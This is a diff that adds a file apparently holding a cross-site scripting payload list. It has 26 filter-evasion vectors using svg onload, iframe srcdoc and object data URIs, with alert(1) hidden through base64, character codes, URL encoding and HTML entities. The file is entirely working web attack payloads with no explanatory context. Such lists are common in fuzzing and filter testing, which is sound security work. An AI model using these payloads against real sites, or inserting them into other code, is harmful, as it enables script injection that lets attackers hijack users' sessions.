@@ -1,0 +1,26 @@
+<svg onload=window['al'+'ert'](1)>
+<iframe srcdoc="<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>" ></iframe>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<svg onload=window[&quot;a&quot;+&quot;lert&quot;](1)>"></iframe>
+<iframe srcdoc="<img src=1 onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>
+<svg onload=setTimeout(&#x61;&#x6C;&#x65;&#x72;&#x74;(1),0)>
+<iframe srcdoc='<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))>'></iframe>
+<object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>
+<iframe srcdoc='<svg onload=eval(decodeURIComponent("%61%6C%65%72%74(1)"))>'></iframe>
+<object data='data:text/html,<svg onload=eval(atob("YWxlcnQoMSk="))>'></object>
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<iframe srcdoc="<img src=x onerror=setTimeout(eval(atob('YWxlcnQoMSk=')),0)>"></iframe>
+<svg onload=setTimeout(&#x61;&#x6C;&#x65;&#x72;&#x74;(1),0)>
+<object data='data:text/html,<svg onload=setTimeout(&#x61;&#x6C;&#x65;&#x72;&#x74;(1),0)>'></object>
+<iframe srcdoc="<svg onload=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>"></iframe>
+<object data='data:text/html,<svg onload=eval(decodeURIComponent("%61%6C%65%72%74(1)"))>'></object>
+<iframe srcdoc="<svg onload=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>"></iframe>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<object data='data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></object>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<object data='data:text/html,<svg onload=eval(atob("YWxlcnQoMSk="))>'></object>
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>"></iframe>
